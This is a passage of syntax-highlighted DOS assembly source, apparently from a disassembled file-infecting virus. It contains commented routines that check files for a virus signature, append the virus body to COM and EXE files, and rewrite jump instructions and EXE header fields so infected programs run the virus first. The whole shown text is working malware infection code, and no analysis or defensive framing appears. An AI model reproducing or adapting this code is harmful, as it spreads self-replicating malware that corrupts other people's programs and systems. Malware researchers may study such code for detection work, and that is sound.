    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Length to read</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0440</span><span class="sc0">          </span><span class="sc1">; Test virus signature on file</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0420</span><span class="sc0">          </span><span class="sc1">; Branch if not present</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ISWTCH</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set infected file switch on</span><span class="sc0">
</span><span class="sc5">BP0410</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
</span><span class="sc5">BP0420</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0500</span><span class="sc0">          </span><span class="sc1">; Move pointer to end of file</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FLENLO</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save file length, low word</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FLENHI</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Save file length, high word</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0FFFFH</span><span class="sc0">  </span><span class="sc1">; Initialise count</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; Length to write</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Address start of buffer</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address start of virus</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SIGNAT</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer (start) function</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ No displacement</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc2">0E9H</span><span class="sc0">  </span><span class="sc1">; Near jump instruction</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Recover length of file</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0010</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">  </span><span class="sc1">; Jump offset to entry point</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Store in jump instruction</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Address of jump instruction</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Length to write</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">CLC</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; EXE file</span><span class="sc0">

</span><span class="sc5">BP0430</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0CH</span><span class="sc4">],</span><span class="sc2">0FFFFH</span><span class="sc0"> </span><span class="sc1">; Is max alloc asking for maximum?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0450</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get initial offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get initial segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Copy segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">           </span><span class="sc1">; Move top byte down</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">           </span><span class="sc1">; Clear top</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; \
    SHR CX,1            ;  \ Move top nibble into position</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;  /</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; \
    SHL AX,1            ;  \ Move rest of segment</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;  /</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Add to offset</span><span class="sc0">
    </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; \ Subtract length of signature</span><span class="sc0">
    </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get size of header</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0490</span><span class="sc0">          </span><span class="sc1">; Move segment to two-register offset</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Add to starting position</span><span class="sc0">
    </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Move low word</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer (start) function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Address buffer</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">001CH</span><span class="sc0">        </span><span class="sc1">; Add length of EXE header</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3FH</span><span class="sc0">          </span><span class="sc1">; Read handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Length to read</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0440</span><span class="sc0">          </span><span class="sc1">; Test virus signature on file</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0480</span><span class="sc0">          </span><span class="sc1">; Branch if not present</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ISWTCH</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Set infected file switch on</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Test virus signature on file</span><span class="sc0">

</span><span class="sc5">BP0440</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1CH</span><span class="sc4">],</span><span class="sc2">4756H</span><span class="sc0"> </span><span class="sc1">; Look for virus signature</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0470</span><span class="sc0">          </span><span class="sc1">; Branch if not found</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1EH</span><span class="sc4">],</span><span class="sc2">31H</span><span class="sc0">   </span><span class="sc1">; Look for rest of signature</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0470</span><span class="sc0">          </span><span class="sc1">; Branch if not found</span><span class="sc0">
</span><span class="sc5">BP0450</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STC</span><span class="sc0">
</span><span class="sc5">BP0460</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">BP0470</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CLC</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Infect EXE file</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
</span><span class="sc5">BP0480</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0500</span><span class="sc0">          </span><span class="sc1">; Move pointer to end of file</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FLENLO</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save file length, low word</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">FLENHI</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Save file length, high word</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get size of file in pages</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Multiply by two</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">           </span><span class="sc1">; Reverse bytes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Copy</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">0FF00H</span><span class="sc0">       </span><span class="sc1">; Convert to bytes (low word)</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">CH</span><span class="sc0">           </span><span class="sc1">; Convert to bytes (high word)</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; \ Add number of relocation entries</span><span class="sc0">
    </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Subtract current length</span><span class="sc0">
    </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0460</span><span class="sc0">          </span><span class="sc1">; Branch if overlay</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Save length of host, low word</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">; Save length of host, high word</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">18H</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save offset to relocation table</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">18H</span><span class="sc4">],</span><span class="sc2">0FFH</span><span class="sc0">  </span><span class="sc1">; Original entry address marker</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; Length to write</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; \ Address host entry address</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">14H</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">18H</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Recover offset to relocation table</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Address start of virus</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SIGNAT</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4200H</span><span class="sc0">        </span><span class="sc1">; Move file pointer (start) function</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ No displacement</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Recover length of host, high word</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Recover length of host, low word</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">],</span><span class="sc2">00FAH</span><span class="sc0"> </span><span class="sc1">; \ Add entry point</span><span class="sc0">
    </span><span class="sc6">ADC</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get size of header</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0490</span><span class="sc0">          </span><span class="sc1">; Move segment to two-register offset</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">14H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; \ Subtract size of header</span><span class="sc0">
    </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">     </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0CH</span><span class="sc0">          </span><span class="sc1">; Bits to move</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">    </span><span class="sc1">; Convert high word to segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Add bytes in last paragraph</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Store new figure</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">01FFH</span><span class="sc0">        </span><span class="sc1">; Set off top bits</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; Copy high byte</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; Clear top of register</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Divide by two</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Add to pages</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Move address of EXE header</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001CH</span><span class="sc0">        </span><span class="sc1">; EXE header length</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; Write handle function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">CLC</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Move segment to two-register offset</span><span class="sc0">

</span><span class="sc5">BP0490</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; \ Move double one bit</span><span class="sc0">
    </span><span class="sc6">RCL</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; \ Move double one bit</span><span class="sc0">
    </span><span class="sc6">RCL</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; \ Move double one bit</span><span class="sc0">
    </span><span class="sc6">RCL</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; \ Move double one bit</span><span class="sc0">
